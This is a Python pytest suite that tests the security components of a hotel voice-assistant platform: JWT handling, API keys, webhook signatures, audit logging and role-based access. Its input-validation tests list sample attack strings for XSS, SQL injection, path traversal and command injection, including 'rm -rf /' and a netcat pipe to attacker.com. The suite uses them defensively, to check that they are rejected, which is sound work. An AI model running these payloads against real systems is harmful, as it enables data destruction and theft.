"""
Comprehensive Security Testing & Validation Suite for VoiceHive Hotels
Tests JWT token security, API key validation, input validation, audit logging, 
webhook signature verification, and RBAC permission boundaries
"""

import pytest
import jwt
import hmac
import hashlib
import json
import time
import uuid
from datetime import datetime, timedelta
from typing import Dict, Any, List
from unittest.mock import Mock, patch, AsyncMock
from fastapi import FastAPI, Request, HTTPException
from fastapi.testclient import TestClient
from starlette.responses import JSONResponse

# Import security components
from jwt_service import JWTService
from auth_middleware import AuthenticationMiddleware, get_current_user, require_permissions
from auth_models import UserContext, ServiceContext, UserRole, Permission, AuthenticationError
from webhook_security import WebhookSecurityManager, WebhookConfig, WebhookSource
from input_validation_middleware import InputValidationMiddleware, SecurityValidator, ValidationConfig
from audit_logging import AuditLogger, AuditEventType, AuditSeverity, AuditContext
from vault_client import VaultClient


class TestJWTTokenSecurity:
    """Test JWT token security validation"""
    
    @pytest.fixture
    async def jwt_service(self):
        """Create JWT service for testing"""
        service = JWTService("redis://localhost:6379", secret_key="test-secret-key")
        # Mock Redis for testing
        service.redis_pool = Mock()
        service.get_redis = AsyncMock()
        return service
    
    @pytest.fixture
    def sample_user_context(self):
        """Sample user context for testing"""
        return UserContext(
            user_id="test-user-123",
            email="test@example.com",
            roles=[UserRole.HOTEL_ADMIN],
            permissions=[Permission.CALL_START, Permission.HOTEL_VIEW],
            session_id="session-123",
            expires_at=datetime.utcnow() + timedelta(minutes=15),
            hotel_ids=["hotel-1", "hotel-2"]
        )
    
    @pytest.mark.asyncio
    async def test_jwt_token_creation_and_validation(self, jwt_service, sample_user_context):
        """Test JWT token creation and validation"""
        # Mock Redis operations
        redis_mock = AsyncMock()
        jwt_service.get_redis = AsyncMock(return_value=redis_mock)
        
        # Create tokens
        tokens = await jwt_service.create_tokens(sample_user_context)
        
        assert "access_token" in tokens
        assert "refresh_token" in tokens
        assert tokens["token_type"] == "bearer"
        assert tokens["expires_in"] == 15 * 60
        
        # Validate access token
        redis_mock.exists.return_value = False  # Not blacklisted
        redis_mock.hgetall.return_value = {
            b"user_id": b"test-user-123",
            b"email": b"test@example.com",
            b"roles": b"['hotel_admin']",
            b"permissions": b"['call_start', 'hotel_view']",
            b"hotel_ids": b"['hotel-1', 'hotel-2']"
        }
        
        validated_context = await jwt_service.validate_token(tokens["access_token"])
        
        assert validated_context.user_id == sample_user_context.user_id
        assert validated_context.email == sample_user_context.email
    
    @pytest.mark.asyncio
    async def test_jwt_token_expiration(self, jwt_service, sample_user_context):
        """Test JWT token expiration handling"""
        # Create expired token
        expired_payload = {
            "sub": sample_user_context.user_id,
            "email": sample_user_context.email,
            "roles": ["hotel_admin"],
            "iat": int((datetime.utcnow() - timedelta(hours=1)).timestamp()),
            "exp": int((datetime.utcnow() - timedelta(minutes=30)).timestamp()),
            "jti": str(uuid.uuid4()),
            "session_id": "session-123"
        }
        
        expired_token = jwt.encode(expired_payload, jwt_service.private_key, algorithm="RS256")
        
        with pytest.raises(AuthenticationError, match="Token has expired"):
            await jwt_service.validate_token(expired_token)
    
    @pytest.mark.asyncio
    async def test_jwt_token_tampering_detection(self, jwt_service, sample_user_context):
        """Test detection of tampered JWT tokens"""
        # Mock Redis
        redis_mock = AsyncMock()
        jwt_service.get_redis = AsyncMock(return_value=redis_mock)
        
        # Create valid token
        tokens = await jwt_service.create_tokens(sample_user_context)
        
        # Tamper with token
        tampered_token = tokens["access_token"][:-10] + "tampered123"
        
        with pytest.raises(AuthenticationError, match="Invalid token"):
            await jwt_service.validate_token(tampered_token)
    
    @pytest.mark.asyncio
    async def test_jwt_token_blacklisting(self, jwt_service, sample_user_context):
        """Test JWT token blacklisting/revocation"""
        # Mock Redis
        redis_mock = AsyncMock()
        jwt_service.get_redis = AsyncMock(return_value=redis_mock)
        
        # Create token
        tokens = await jwt_service.create_tokens(sample_user_context)
        
        # Revoke token
        await jwt_service.revoke_token(tokens["access_token"])
        
        # Try to validate revoked token
        redis_mock.exists.return_value = True  # Token is blacklisted
        
        with pytest.raises(AuthenticationError, match="Token has been revoked"):
            await jwt_service.validate_token(tokens["access_token"])
    
    @pytest.mark.asyncio
    async def test_jwt_refresh_token_security(self, jwt_service, sample_user_context):
        """Test refresh token security"""
        # Mock Redis
        redis_mock = AsyncMock()
        jwt_service.get_redis = AsyncMock(return_value=redis_mock)
        
        # Create tokens
        tokens = await jwt_service.create_tokens(sample_user_context)
        
        # Mock refresh token validation
        redis_mock.get.return_value = b"session-123"
        redis_mock.hgetall.return_value = {
            b"user_id": b"test-user-123",
            b"email": b"test@example.com",
            b"roles": b"['hotel_admin']",
            b"permissions": b"['call_start', 'hotel_view']",
            b"hotel_ids": b"['hotel-1', 'hotel-2']"
        }
        
        # Refresh token
        new_tokens = await jwt_service.refresh_token(tokens["refresh_token"])
        
        assert "access_token" in new_tokens
        assert new_tokens["token_type"] == "bearer"
        
        # Test invalid refresh token
        with pytest.raises(AuthenticationError):
            await jwt_service.refresh_token("invalid-refresh-token")


class TestAPIKeySecurity:
    """Test API key security and rotation"""
    
    @pytest.fixture
    def vault_client(self):
        """Mock Vault client for testing"""
        client = Mock(spec=VaultClient)
        return client
    
    @pytest.fixture
    def sample_service_context(self):
        """Sample service context for testing"""
        return ServiceContext(
            service_name="test-service",
            api_key_id="api-key-123",
            permissions=[Permission.CALL_START, Permission.SYSTEM_ADMIN],
            rate_limits={"requests_per_minute": 1000}
        )
    
    @pytest.mark.asyncio
    async def test_api_key_validation(self, vault_client, sample_service_context):
        """Test API key validation"""
        # Mock successful validation
        vault_client.validate_api_key = AsyncMock(return_value=sample_service_context)
        
        result = await vault_client.validate_api_key("valid-api-key")
        
        assert result.service_name == "test-service"
        assert Permission.SYSTEM_ADMIN in result.permissions
    
    @pytest.mark.asyncio
    async def test_api_key_invalid(self, vault_client):
        """Test invalid API key handling"""
        vault_client.validate_api_key = AsyncMock(side_effect=AuthenticationError("Invalid API key"))
        
        with pytest.raises(AuthenticationError, match="Invalid API key"):
            await vault_client.validate_api_key("invalid-api-key")
    
    @pytest.mark.asyncio
    async def test_api_key_rotation(self, vault_client):
        """Test API key rotation functionality"""
        # Mock key rotation
        vault_client.rotate_api_key = AsyncMock(return_value={
            "old_key_id": "api-key-123",
            "new_key_id": "api-key-456",
            "new_key": "new-secret-key",
            "expires_at": (datetime.utcnow() + timedelta(days=90)).isoformat()
        })
        
        result = await vault_client.rotate_api_key("api-key-123")
        
        assert result["new_key_id"] == "api-key-456"
        assert "new_key" in result
    
    @pytest.mark.asyncio
    async def test_api_key_rate_limiting(self, vault_client, sample_service_context):
        """Test API key rate limiting"""
        # Test rate limit enforcement
        sample_service_context.rate_limits = {"requests_per_minute": 1}
        vault_client.validate_api_key = AsyncMock(return_value=sample_service_context)
        
        # This would be tested in the rate limiting middleware
        # Here we just verify the rate limits are properly configured
        result = await vault_client.validate_api_key("rate-limited-key")
        assert result.rate_limits["requests_per_minute"] == 1


class TestInputValidationSecurity:
    """Test input validation and injection attack prevention"""
    
    @pytest.fixture
    def security_validator(self):
        """Create security validator for testing"""
        config = ValidationConfig()
        return SecurityValidator(config)
    
    def test_xss_prevention(self, security_validator):
        """Test XSS attack prevention"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "onclick=alert('xss')"
        ]
        
        for payload in xss_payloads:
            with pytest.raises(ValueError, match="potentially malicious content"):
                security_validator.validate_string(payload, "test_field")
    
    def test_sql_injection_prevention(self, security_validator):
        """Test SQL injection prevention"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM passwords --",
            "' OR '1'='1",
            "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
            "' AND 1=1 --"
        ]
        
        for payload in sql_payloads:
            with pytest.raises(ValueError, match="potentially malicious content"):
                security_validator.validate_string(payload, "test_field")
    
    def test_path_traversal_prevention(self, security_validator):
        """Test path traversal attack prevention"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for payload in traversal_payloads:
            with pytest.raises(ValueError, match="potentially malicious content"):
                security_validator.validate_string(payload, "test_field")
    
    def test_command_injection_prevention(self, security_validator):
        """Test command injection prevention"""
        command_payloads = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "$(whoami)",
            "`id`"
        ]
        
        for payload in command_payloads:
            with pytest.raises(ValueError, match="potentially malicious content"):
                security_validator.validate_string(payload, "test_field")
    
    def test_size_limits_enforcement(self, security_validator):
        """Test size limits enforcement"""
        # Test string length limits
        long_string = "x" * 20000
        with pytest.raises(ValueError, match="exceeds maximum length"):
            security_validator.validate_string(long_string, "test_field")
        
        # Test array length limits
        long_array = list(range(2000))
        with pytest.raises(ValueError, match="exceeds maximum array length"):
            security_validator.validate_array(long_array, "test_field")
        
        # Test object depth limits
        deep_object = {"level1": {"level2": {"level3": {"level4": {"level5": {}}}}}}
        # This should pass with default depth limit
        result = security_validator.validate_object(deep_object, "test_field")
        assert isinstance(result, dict)
    
    def test_valid_input_acceptance(self, security_validator):
        """Test that valid input is accepted"""
        valid_inputs = [
            "Hello World",
            "user@example.com",
            "Valid hotel name with spaces",
            {"name": "John", "age": 30},
            ["item1", "item2", "item3"],
            123,
            45.67,
            True,
            None
        ]
        
        for valid_input in valid_inputs:
            try:
                result = security_validator.validate_value(valid_input, "test_field")
                # Should not raise exception
                assert result is not None or valid_input is None
            except ValueError:
                pytest.fail(f"Valid input rejected: {valid_input}")


class TestWebhookSignatureVerification:
    """Test webhook signature verification"""
    
    @pytest.fixture
    def webhook_config(self):
        """Create webhook configuration for testing"""
        return WebhookConfig(
            max_requests_per_minute=10,
            max_payload_size=1024
        )
    
    @pytest.fixture
    def webhook_manager(self, webhook_config):
        """Create webhook security manager for testing"""
        manager = WebhookSecurityManager(webhook_config)
        
        # Register test webhook source
        test_source = WebhookSource(
            name="test-webhook",
            secret_key="test-secret-key",
            signature_header="X-Test-Signature",
            timestamp_header="X-Test-Timestamp",
            signature_format="sha256={signature}"
        )
        manager.register_webhook_source(test_source)
        
        return manager
    
    def test_webhook_signature_calculation(self, webhook_manager):
        """Test webhook signature calculation"""
        payload = b'{"test": "data"}'
        timestamp = str(int(time.time()))
        
        # Calculate signature manually
        signature_payload = payload + timestamp.encode('utf-8')
        expected_signature = hmac.new(
            b"test-secret-key",
            signature_payload,
            hashlib.sha256
        ).hexdigest()
        expected_formatted = f"sha256={expected_signature}"
        
        # Mock request
        request = Mock()
        request.headers = {
            "X-Test-Signature": expected_formatted,
            "X-Test-Timestamp": timestamp,
            "Content-Type": "application/json",
            "User-Agent": "TestAgent/1.0"
        }
        request.client = Mock()
        request.client.host = "192.168.1.1"
        
        # This should not raise an exception
        try:
            webhook_manager.verify_webhook(request, "test-webhook", payload)
        except Exception as e:
            pytest.fail(f"Valid webhook signature rejected: {e}")
    
    def test_webhook_signature_mismatch(self, webhook_manager):
        """Test webhook signature mismatch detection"""
        payload = b'{"test": "data"}'
        timestamp = str(int(time.time()))
        
        # Mock request with wrong signature
        request = Mock()
        request.headers = {
            "X-Test-Signature": "sha256=wrong-signature",
            "X-Test-Timestamp": timestamp,
            "Content-Type": "application/json",
            "User-Agent": "TestAgent/1.0"
        }
        request.client = Mock()
        request.client.host = "192.168.1.1"
        
        with pytest.raises(HTTPException) as exc_info:
            webhook_manager.verify_webhook(request, "test-webhook", payload)
        
        assert exc_info.value.status_code == 403
        assert "Invalid signature" in str(exc_info.value.detail)
    
    def test_webhook_timestamp_validation(self, webhook_manager):
        """Test webhook timestamp validation"""
        payload = b'{"test": "data"}'
        old_timestamp = str(int(time.time()) - 600)  # 10 minutes ago
        
        # Calculate valid signature for old timestamp
        signature_payload = payload + old_timestamp.encode('utf-8')
        signature = hmac.new(
            b"test-secret-key",
            signature_payload,
            hashlib.sha256
        ).hexdigest()
        
        # Mock request with old timestamp
        request = Mock()
        request.headers = {
            "X-Test-Signature": f"sha256={signature}",
            "X-Test-Timestamp": old_timestamp,
            "Content-Type": "application/json",
            "User-Agent": "TestAgent/1.0"
        }
        request.client = Mock()
        request.client.host = "192.168.1.1"
        
        with pytest.raises(HTTPException) as exc_info:
            webhook_manager.verify_webhook(request, "test-webhook", payload)
        
        assert exc_info.value.status_code == 400
        assert "timestamp too old" in str(exc_info.value.detail)
    
    def test_webhook_rate_limiting(self, webhook_manager):
        """Test webhook rate limiting"""
        payload = b'{"test": "data"}'
        
        # Make multiple requests quickly
        for i in range(15):  # Exceed the limit of 10
            timestamp = str(int(time.time()))
            signature_payload = payload + timestamp.encode('utf-8')
            signature = hmac.new(
                b"test-secret-key",
                signature_payload,
                hashlib.sha256
            ).hexdigest()
            
            request = Mock()
            request.headers = {
                "X-Test-Signature": f"sha256={signature}",
                "X-Test-Timestamp": timestamp,
                "Content-Type": "application/json",
                "User-Agent": "TestAgent/1.0"
            }
            request.client = Mock()
            request.client.host = "192.168.1.1"
            
            if i >= 10:  # Should start failing after 10 requests
                with pytest.raises(HTTPException) as exc_info:
                    webhook_manager.verify_webhook(request, "test-webhook", payload)
                assert exc_info.value.status_code == 429


class TestAuditLoggingCompleteness:
    """Test audit logging completeness verification"""
    
    @pytest.fixture
    def audit_logger(self):
        """Create audit logger for testing"""
        return AuditLogger(
            service_name="test-service",
            environment="test",
            enable_pii_redaction=True
        )
    
    @pytest.fixture
    def sample_context(self):
        """Sample audit context for testing"""
        return AuditContext(
            user_id="test-user-123",
            user_email="test@example.com",
            client_ip="192.168.1.1",
            session_id="session-123",
            service_name="test-service"
        )
    
    def test_authentication_event_logging(self, audit_logger, sample_context):
        """Test authentication event logging"""
        with patch.object(audit_logger, '_process_and_log_event') as mock_log:
            audit_logger.log_authentication_event(
                event_type=AuditEventType.LOGIN_SUCCESS,
                user_id="test-user-123",
                user_email="test@example.com",
                success=True,
                context=sample_context
            )
            
            mock_log.assert_called_once()
            event = mock_log.call_args[0][0]
            
            assert event.event_type == AuditEventType.LOGIN_SUCCESS
            assert event.context.user_id == "test-user-123"
            assert event.success is True
            assert event.severity == AuditSeverity.MEDIUM
    
    def test_data_access_event_logging(self, audit_logger, sample_context):
        """Test data access event logging"""
        with patch.object(audit_logger, '_process_and_log_event') as mock_log:
            audit_logger.log_data_access_event(
                action="read",
                resource_type="booking",
                resource_id="booking-123",
                data_subject_id="guest-456",
                context=sample_context
            )
            
            mock_log.assert_called_once()
            event = mock_log.call_args[0][0]
            
            assert event.event_type == AuditEventType.DATA_READ
            assert event.resource_type == "booking"
            assert event.resource_id == "booking-123"
            assert event.data_subject_id == "guest-456"
    
    def test_pii_event_logging(self, audit_logger, sample_context):
        """Test PII event logging"""
        with patch.object(audit_logger, '_process_and_log_event') as mock_log:
            audit_logger.log_pii_event(
                action="access",
                pii_types=["email", "phone"],
                data_subject_id="guest-456",
                context=sample_context
            )
            
            mock_log.assert_called_once()
            event = mock_log.call_args[0][0]
            
            assert event.event_type == AuditEventType.PII_ACCESS
            assert event.severity == AuditSeverity.HIGH
            assert "email" in event.metadata["pii_types"]
            assert "phone" in event.metadata["pii_types"]
    
    def test_security_event_logging(self, audit_logger, sample_context):
        """Test security event logging"""
        with patch.object(audit_logger, '_process_and_log_event') as mock_log:
            audit_logger.log_security_event(
                description="Suspicious login attempt detected",
                severity=AuditSeverity.CRITICAL,
                context=sample_context,
                metadata={"failed_attempts": 5}
            )
            
            mock_log.assert_called_once()
            event = mock_log.call_args[0][0]
            
            assert event.event_type == AuditEventType.SECURITY_VIOLATION
            assert event.severity == AuditSeverity.CRITICAL
            assert event.success is False
            assert event.metadata["failed_attempts"] == 5
    
    def test_audit_context_creation_from_request(self, audit_logger):
        """Test audit context creation from request"""
        # Mock FastAPI request
        request = Mock()
        request.headers = {
            "X-Correlation-ID": "corr-123",
            "User-Agent": "TestAgent/1.0",
            "X-Forwarded-For": "192.168.1.1"
        }
        request.state = Mock()
        request.state.request_id = "req-123"
        
        user_context = {
            "user_id": "user-123",
            "user_email": "test@example.com",
            "roles": ["hotel_admin"],
            "session_id": "session-123"
        }
        
        context = audit_logger.create_context_from_request(request, user_context)
        
        assert context.request_id == "req-123"
        assert context.correlation_id == "corr-123"
        assert context.user_id == "user-123"
        assert context.user_email == "test@example.com"
        assert context.client_ip == "192.168.1.1"
    
    def test_audit_operation_context_manager(self, audit_logger, sample_context):
        """Test audit operation context manager"""
        with patch.object(audit_logger, '_process_and_log_event') as mock_log:
            with audit_logger.audit_operation(
                operation_name="test_operation",
                resource_type="test_resource",
                resource_id="resource-123",
                context=sample_context
            ):
                # Simulate some work
                pass
            
            # Should log start and completion events
            assert mock_log.call_count == 2
            
            start_event = mock_log.call_args_list[0][0][0]
            end_event = mock_log.call_args_list[1][0][0]
            
            assert start_event.action == "start"
            assert end_event.action == "complete"
            assert end_event.success is True


class TestRBACPermissionBoundaries:
    """Test RBAC permission boundary enforcement"""
    
    @pytest.fixture
    def app(self):
        """Create FastAPI app for testing"""
        app = FastAPI()
        
        @app.get("/public")
        async def public_endpoint():
            return {"message": "public"}
        
        @app.get("/protected", dependencies=[Depends(require_permissions(Permission.CALL_START))])
        async def protected_endpoint():
            return {"message": "protected"}
        
        @app.get("/admin", dependencies=[Depends(require_permissions(Permission.SYSTEM_ADMIN))])
        async def admin_endpoint():
            return {"message": "admin"}
        
        return app
    
    @pytest.fixture
    def client(self, app):
        """Create test client"""
        return TestClient(app)
    
    def test_permission_boundary_enforcement(self):
        """Test that permission boundaries are properly enforced"""
        # Test user with limited permissions
        limited_user = UserContext(
            user_id="limited-user",
            email="limited@example.com",
            roles=[UserRole.GUEST_USER],
            permissions=[Permission.CALL_VIEW],  # No CALL_START permission
            session_id="session-123",
            expires_at=datetime.utcnow() + timedelta(minutes=15)
        )
        
        # Test user with admin permissions
        admin_user = UserContext(
            user_id="admin-user",
            email="admin@example.com",
            roles=[UserRole.SYSTEM_ADMIN],
            permissions=[Permission.SYSTEM_ADMIN, Permission.CALL_START],
            session_id="session-456",
            expires_at=datetime.utcnow() + timedelta(minutes=15)
        )
        
        # Mock authentication middleware to return different users
        with patch('auth_middleware.get_current_user') as mock_get_user:
            # Test limited user access
            mock_get_user.return_value = limited_user
            
            # Should be denied access to protected endpoint
            with pytest.raises(HTTPException) as exc_info:
                require_permissions(Permission.CALL_START)(limited_user)
            
            assert exc_info.value.status_code == 403
            
            # Test admin user access
            mock_get_user.return_value = admin_user
            
            # Should have access to admin endpoint
            result = require_permissions(Permission.SYSTEM_ADMIN)(admin_user)
            assert result == admin_user
    
    def test_role_based_access_control(self):
        """Test role-based access control"""
        from auth_middleware import require_roles
        
        # Test user with hotel admin role
        hotel_admin = UserContext(
            user_id="hotel-admin",
            email="admin@hotel.com",
            roles=[UserRole.HOTEL_ADMIN],
            permissions=[Permission.HOTEL_VIEW, Permission.CALL_START],
            session_id="session-789",
            expires_at=datetime.utcnow() + timedelta(minutes=15)
        )
        
        # Test user with guest role
        guest_user = UserContext(
            user_id="guest",
            email="guest@example.com",
            roles=[UserRole.GUEST_USER],
            permissions=[Permission.CALL_VIEW],
            session_id="session-101",
            expires_at=datetime.utcnow() + timedelta(minutes=15)
        )
        
        # Test role requirement
        with patch('auth_middleware.get_current_user') as mock_get_user:
            # Hotel admin should have access
            mock_get_user.return_value = hotel_admin
            result = require_roles("hotel_admin")(hotel_admin)
            assert result == hotel_admin
            
            # Guest should be denied
            mock_get_user.return_value = guest_user
            with pytest.raises(HTTPException) as exc_info:
                require_roles("hotel_admin")(guest_user)
            
            assert exc_info.value.status_code == 403
    
    def test_hotel_specific_authorization(self):
        """Test hotel-specific authorization boundaries"""
        from auth_middleware import AuthenticationMiddleware
        
        # User with access to specific hotels
        hotel_user = UserContext(
            user_id="hotel-user",
            email="user@hotel.com",
            roles=[UserRole.HOTEL_STAFF],
            permissions=[Permission.HOTEL_VIEW],
            session_id="session-202",
            expires_at=datetime.utcnow() + timedelta(minutes=15),
            hotel_ids=["hotel-1", "hotel-2"]
        )
        
        # Mock request for hotel-1 (should be allowed)
        request_hotel1 = Mock()
        request_hotel1.url.path = "/hotels/hotel-1/bookings"
        request_hotel1.query_params = {}
        
        # Mock request for hotel-3 (should be denied)
        request_hotel3 = Mock()
        request_hotel3.url.path = "/hotels/hotel-3/bookings"
        request_hotel3.query_params = {}
        
        # Create middleware instance
        jwt_service = Mock()
        vault_client = Mock()
        middleware = AuthenticationMiddleware(None, jwt_service, vault_client)
        
        # Test hotel-1 access (should pass)
        try:
            middleware._authorize_user_request(request_hotel1, hotel_user)
        except Exception:
            pytest.fail("Should allow access to hotel-1")
        
        # Test hotel-3 access (should fail)
        with pytest.raises(Exception):  # Should raise AuthorizationError
            middleware._authorize_user_request(request_hotel3, hotel_user)


class TestSecurityIntegration:
    """Integration tests for security components"""
    
    @pytest.mark.asyncio
    async def test_end_to_end_authentication_flow(self):
        """Test complete authentication flow"""
        # This would test the full flow from login to API access
        # Including JWT creation, validation, and permission checking
        pass
    
    @pytest.mark.asyncio
    async def test_security_middleware_integration(self):
        """Test integration of all security middleware"""
        # This would test how all middleware components work together
        # Including input validation, authentication, and audit logging
        pass
    
    @pytest.mark.asyncio
    async def test_security_event_correlation(self):
        """Test security event correlation across components"""
        # This would test that security events are properly correlated
        # across different components using correlation IDs
        pass


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v"])